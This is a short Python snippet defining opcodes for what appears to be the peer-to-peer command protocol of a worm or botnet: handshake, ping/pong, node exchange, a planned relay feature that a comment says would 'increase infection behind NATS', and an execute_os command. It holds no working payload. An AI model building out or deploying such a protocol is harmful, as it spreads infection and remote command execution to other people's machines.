class opcodes:
    helo = 0x00
    ready = 0x01
    ping = 0x02
    pong = 0x03
    nodes_request = 0x04
    nodes_response = 0x05
    # TODO: implement relay system, this can greatly increase infection behind NATS
    #relay_request = 0x06
    #relay_response = 0x07
    execute_os = 0x08